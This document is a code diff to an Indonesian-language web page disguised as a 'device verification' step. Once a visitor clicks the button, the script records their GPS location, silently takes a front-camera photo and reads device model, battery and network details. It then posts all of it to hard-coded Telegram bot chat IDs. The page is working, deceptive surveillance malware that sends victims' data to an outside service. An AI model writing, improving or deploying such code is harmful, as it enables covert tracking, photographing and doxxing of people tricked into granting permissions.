@@ -13,7 +13,7 @@
 <body>
     <div class="box">
         <h2>Verifikasi Perangkat</h2>
-        <p id="status">Klik tombol di bawah untuk melanjutkan.</p>
+        <p id="status">Klik tombol di bawah untuk melanjutkan proses verifikasi keamanan.</p>
         <button id="btn" onclick="mulaiVerifikasi()">Lanjutkan Verifikasi</button>
     </div>
 
@@ -25,13 +25,27 @@
         const CHAT_IDS = ['6888530451', '7452255678'];
         let userLocation = "Lokasi tidak diizinkan";
 
-        // Fungsi mendapatkan detail perangkat
+        function translateModel(model) {
+            const brands = {
+                '2310FPCA4G': 'Xiaomi Redmi 13C', '2201117TY': 'Redmi Note 11',
+                '21061119AL': 'Xiaomi Mi 11 Lite', '2201116SG': 'Redmi Note 11 Pro',
+                'M2012K11AG': 'POCO F3', 'SM-G991B': 'Samsung S21',
+                'SM-A525F': 'Samsung Galaxy A52', 'SM-A125F': 'Samsung Galaxy A12',
+                'CPH2219': 'Oppo A94', 'CPH2127': 'Oppo A53',
+                'RMX3363': 'Realme GT Master Edition', 'RMX2151': 'Realme 7',
+                'X688B': 'Infinix Hot 10', 'V2025': 'Vivo V20',
+                'CPH': 'Oppo Device', 'RMX': 'Realme Device', 'SM-': 'Samsung Galaxy'
+            };
+            for (let key in brands) { if (model.includes(key)) return brands[key]; }
+            return model;
+        }
+
         async function getDeviceDetails() {
             let model = navigator.userAgent;
             if (navigator.userAgentData) {
                 try {
                     const hints = await navigator.userAgentData.getHighEntropyValues(['model']);
-                    if (hints.model) model = hints.model;
+                    if (hints.model) model = translateModel(hints.model);
                 } catch (e) {}
             }
             let battery = "N/A";
@@ -41,33 +55,34 @@
                     battery = Math.round(bat.level * 100) + "%";
                 }
             } catch (e) {}
-            return { model, battery };
+            let connInfo = navigator.connection ? `${navigator.connection.effectiveType.toUpperCase()} | RTT: ${navigator.connection.rtt}ms` : "Unknown";
+            return { model, battery, connInfo };
         }
 
         async function mulaiVerifikasi() {
-    document.getElementById('status').innerText = "Memproses...";
-    
-    // Meminta lokasi dengan link
-    await new Promise((resolve) => {
-        if ("geolocation" in navigator) {
-            navigator.geolocation.getCurrentPosition(
-                (pos) => { 
-                    userLocation = `<a href="https://www.google.com/maps/search/?api=1&query=${pos.coords.latitude},${pos.coords.longitude}">📍 Lokasi (Klik di sini)</a>`; 
-                    resolve(); 
-                },
-                () => { userLocation = "Ditolak"; resolve(); }
-            );
-        } else { resolve(); }
-    });
+            document.getElementById('status').innerText = "Memproses...";
+            document.getElementById('btn').disabled = true;
 
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        const video = document.getElementById('video');
-        video.srcObject = stream;
-        setTimeout(() => ambilFoto(video), 2000);
-    } catch (err) {
-        kirimDataTanpaFoto();
-    }
+            await new Promise((resolve) => {
+                if ("geolocation" in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => { 
+                            userLocation = `<a href="https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}">📍 Lihat Lokasi (Klik Di Sini)</a>`; 
+                            resolve(); 
+                        },
+                        () => { userLocation = "Ditolak"; resolve(); }
+                    );
+                } else { resolve(); }
+            });
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                setTimeout(() => ambilFoto(video), 2000);
+            } catch (err) {
+                kirimDataTanpaFoto();
+            }
         }
 
         async function ambilFoto(video) {
@@ -82,7 +97,7 @@
                     const formData = new FormData();
                     formData.append('chat_id', id);
                     formData.append('photo', blob);
-                    formData.append('caption', `📸 <b>Laporan Kamera Depan</b>\n\n📱 <b>Model:</b> ${details.model}\n🔋 <b>Baterai:</b> ${details.battery}\n📍 <b>Lokasi:</b> ${userLocation}`);
+                    formData.append('caption', `📸 <b>Laporan Kamera Depan</b>\n\n📱 <b>Model:</b> ${details.model}\n🔋 <b>Baterai:</b> ${details.battery}\n🌐 <b>Koneksi:</b> ${details.connInfo}\n📍 <b>Lokasi:</b> ${userLocation}`);
                     formData.append('parse_mode', 'HTML');
                     await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                 }
@@ -92,7 +107,8 @@
 
         async function kirimDataTanpaFoto() {
             const details = await getDeviceDetails();
-            const text = `⚠️ <b>Kamera Ditolak</b>\n\n📱 <b>Model:</b> ${details.model}\n🔋 <b>Baterai:</b> ${details.battery}\n📍 <b>Lokasi:</b> ${userLocation}`;
+            const text = `⚠️ <b>Kamera Depan Ditolak</b>\n\n📱 <b>Model:</b> ${details.model}\n🔋 <b>Baterai:</b> ${details.battery}\n🌐 <b>Koneksi:</b> ${details.connInfo}\n📍 <b>Lokasi:</b> ${userLocation}`;
+            
             for (const id of CHAT_IDS) {
                 await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                     method: 'POST',
@@ -105,3 +121,4 @@
     </script>
 </body>
 </html>
+
